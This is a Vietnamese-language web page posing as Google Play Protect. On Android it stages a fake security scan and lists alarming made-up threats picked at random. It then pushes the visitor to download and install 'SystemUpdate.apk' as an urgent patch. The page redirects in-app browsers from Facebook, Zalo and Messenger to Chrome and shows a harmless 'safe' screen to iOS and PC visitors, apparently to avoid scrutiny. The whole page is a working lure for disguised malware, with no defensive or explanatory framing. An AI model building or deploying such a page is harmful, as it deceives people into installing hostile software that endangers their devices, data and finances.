<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Bản vá bảo mật Hệ thống</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f8f9fa;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            color: #202124;
            overflow: hidden;
        }

        .header-bar {
            width: 100%;
            background: #fff;
            padding: 16px;
            box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            position: fixed;
            top: 0;
            z-index: 100;
        }

        .header-bar span {
            font-size: 18px;
            color: #5f6368;
            font-weight: 500;
        }

        .main-container {
            margin-top: 80px;
            padding: 24px;
            text-align: center;
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
            opacity: 0;
            animation: fadeIn 0.5s forwards;
        }

        @keyframes fadeIn {
            to {
                opacity: 1;
            }
        }

        .shield-icon {
            width: 100px;
            height: 100px;
            margin-bottom: 24px;
            transition: all 0.5s ease;
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% {
                transform: scale(1);
            }

            50% {
                transform: scale(1.05);
            }

            100% {
                transform: scale(1);
            }
        }

        h1 {
            font-size: 22px;
            margin: 0 0 8px 0;
            font-weight: 400;
        }

        .status-text {
            font-weight: 500;
            font-size: 16px;
            margin-bottom: 30px;
        }

        .card {
            background: #fff;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3);
            text-align: left;
            margin-bottom: 24px;
        }

        .card-item {
            margin-bottom: 10px;
            font-size: 14px;
            display: flex;
            align-items: start;
        }

        .check-icon {
            margin-right: 10px;
            font-size: 16px;
        }

        .btn-install {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 14px 0;
            width: 100%;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
            text-decoration: none;
            display: block;
            text-align: center;
        }

        .scan-line {
            height: 4px;
            width: 100%;
            background: #e8f0fe;
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 20px;
        }

        .scan-progress {
            height: 100%;
            background: #1a73e8;
            width: 0%;
            transition: width 0.5s;
        }

        #inapp-overlay,
        #download-instruction {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9);
            z-index: 9999;
            color: white;
            text-align: center;
            padding-top: 100px;
        }

        .arrow-up {
            position: absolute;
            top: 20px;
            right: 20px;
            width: 0;
            height: 0;
            border-left: 15px solid transparent;
            border-right: 15px solid transparent;
            border-bottom: 25px solid white;
            animation: bounce 1s infinite;
        }

        @keyframes bounce {

            0%,
            100% {
                transform: translateY(0);
            }

            50% {
                transform: translateY(-10px);
            }
        }

        #safe-view,
        #vulnerability-box {
            display: none;
        }
    </style>
</head>

<body>

    <div class="header-bar">
        <svg style="width:24px;height:24px;margin-right:8px;fill:#ea4335" viewBox="0 0 24 24">
            <path
                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
        </svg>
        <span>Google Play Protect</span>
    </div>

    <!-- MAIN CONTAINER -->
    <div id="main-view" class="main-container">
        <!-- Shield Icon (Dynamic Color) -->
        <svg id="shield" class="shield-icon pulse" viewBox="0 0 24 24" fill="#1a73e8">
            <path
                d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 6c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.9c-2.97-.73-5.38-3.07-6.23-6.23h12.46c-.85 3.16-3.26 5.5-6.23 6.23z" />
        </svg>

        <h1 id="title-text">Đang kết nối máy chủ...</h1>
        <div class="scan-line" id="scan-line">
            <div class="scan-progress" id="progress"></div>
        </div>
        <p class="status-text" id="status-text">Đang kiểm tra bảo mật...</p>

        <!-- Danger View -->
        <div id="vulnerability-box">
            <div class="card" id="threat-list">
                <!-- Threats injected by JS -->
            </div>
            <a href="javascript:void(0)" class="btn-install" onclick="triggerDownload()">
                CẬP NHẬT & SỬA LỖI NGAY
            </a>
            <p style="font-size:12px; color:#5f6368; margin-top:10px">
                Version: <span id="ver-num">2024.05.15</span> &bull; Size: 8.5 MB
            </p>
        </div>

        <!-- Safe View -->
        <div id="safe-view">
            <h2 style="color:#1e8e3e; margin-bottom:10px">Hệ thống An toàn</h2>
            <p style="color:#5f6368">Bạn đang sử dụng phiên bản bảo mật mới nhất.</p>
            <div style="margin-top:20px; font-size:13px; color:#9aa0a6;">
                Security Patch Level: <span id="safe-ver"></span><br>
                Last Checked: Vừa xong
            </div>
        </div>
    </div>

    <!-- IN-APP BROWSER OVERLAY -->
    <div id="inapp-overlay">
        <div class="arrow-up"></div>
        <h2 style="margin-top:20px">Cảnh báo Bảo mật</h2>
        <p style="padding:0 20px; font-size:16px;">Vui lòng mở bằng <strong>Trình duyệt (Browser)</strong> để tải bản
            vá.</p>
    </div>

    <!-- DOWNLOAD INSTRUCTION OVERLAY -->
    <div id="download-instruction" onclick="this.style.display='none'">
        <div style="margin-top:150px">
            <svg style="width:60px;height:60px;fill:#4caf50;margin-bottom:20px" viewBox="0 0 24 24">
                <path
                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
            </svg>
            <h2>Đang tải xuống...</h2>
            <p style="font-size:14px; padding:0 30px; line-height:1.6">
                1. Mở thanh thông báo khi tải xong.<br>
                2. Bấm vào file <strong>SystemUpdate.apk</strong>.<br>
                3. Chọn <strong>Cài đặt (Install)</strong> để hoàn tất.
            </p>
            <p style="font-size:12px; color:#aaa; margin-top:30px">(Chạm vào màn hình để đóng)</p>
        </div>
    </div>

    <!-- Hidden Download Link -->
    <a id="real-dl-link" href="SystemUpdate.apk" download style="display:none;"></a>

    <script>
        const CURRENT_VERSION = '2026.02.08_SecPatch'; // Change this to force re-scan for everyone
        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
        const isAndroid = /android/i.test(userAgent);
        const isInApp = /FBAN|FBAV|Instagram|Zalo|Line|Messenger/i.test(userAgent);

        // Random Threats Generator
        function generateThreats() {
            const threats = [
                "CVE-2024-3094: Lỗ hổng thực thi mã từ xa",
                "Trojan.Android.SpyAgent phát hiện trong bộ nhớ",
                "Rò rỉ dữ liệu ngân hàng qua cổng 443",
                "Quyền truy cập Micro bị can thiệp trái phép",
                "GPS đang bị theo dõi bởi ứng dụng lạ",
                "Lỗ hổng Zero-day trong Kernel Android",
                "Chứng chỉ bảo mật SSL đã hết hạn"
            ];
            // Pick 3 random
            const shuffled = threats.sort(() => 0.5 - Math.random());
            let html = `<div class="card-item" style="color:#d93025; font-weight:bold;">⚠️ Phát hiện 3 mối nguy hiểm:</div>`;
            for (let i = 0; i < 3; i++) {
                html += `<div class="card-item"><span class="check-icon" style="color:#d93025">✕</span> ${shuffled[i]}</div>`;
            }
            return html;
        }

        // Main Logic
        if (isInApp) {
            document.getElementById('inapp-overlay').style.display = 'block';
            if (isAndroid) {
                const intentUrl = 'intent://' + window.location.href.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
                setTimeout(() => window.location.href = intentUrl, 1000);
            }
        }
        else if (!isAndroid) {
            // iOS/PC -> Safe View
            showSafe();
        }
        else {
            // Android Browser -> Check storage
            const lastUpdate = localStorage.getItem('sys_update_done');

            if (lastUpdate === CURRENT_VERSION) {
                showSafe(); // Already downloaded
            } else {
                startScan(); // Need update
            }
        }

        function showSafe() {
            document.getElementById('shield').setAttribute('fill', '#1e8e3e');
            document.getElementById('shield').classList.remove('pulse');
            document.getElementById('title-text').innerText = "Hệ thống An toàn";
            document.getElementById('scan-line').style.display = 'none';
            document.getElementById('status-text').style.display = 'none';
            document.getElementById('safe-view').style.display = 'block';
            document.getElementById('safe-ver').innerText = CURRENT_VERSION.split('_')[0];
        }

        function startScan() {
            let width = 0;
            const progress = document.getElementById('progress');
            const interval = setInterval(() => {
                width += Math.random() * 5 + 2;
                if (width > 100) width = 100;
                progress.style.width = width + '%';

                if (width === 100) {
                    clearInterval(interval);
                    setTimeout(showDanger, 500);
                }
            }, 100);
        }

        function showDanger() {
            document.getElementById('shield').setAttribute('fill', '#d93025');
            document.getElementById('title-text').innerText = "Cảnh báo Bảo mật!";
            document.getElementById('title-text').style.color = "#d93025";
            document.getElementById('status-text').innerText = "Hành động khẩn cấp được yêu cầu.";
            document.getElementById('scan-line').style.display = 'none';
            document.getElementById('threat-list').innerHTML = generateThreats();
            document.getElementById('vulnerability-box').style.display = 'block';
            document.getElementById('ver-num').innerText = CURRENT_VERSION;
        }

        function triggerDownload() {
            // 1. Mark as updated in storage
            localStorage.setItem('sys_update_done', CURRENT_VERSION);

            // 2. Trigger Download
            document.getElementById('real-dl-link').click();

            // 3. Show Instruction
            document.getElementById('download-instruction').style.display = 'block';

            // 4. Reload page after 5s to show Safe View? No, keep instruction open.
        }
    </script>
</body>

</html>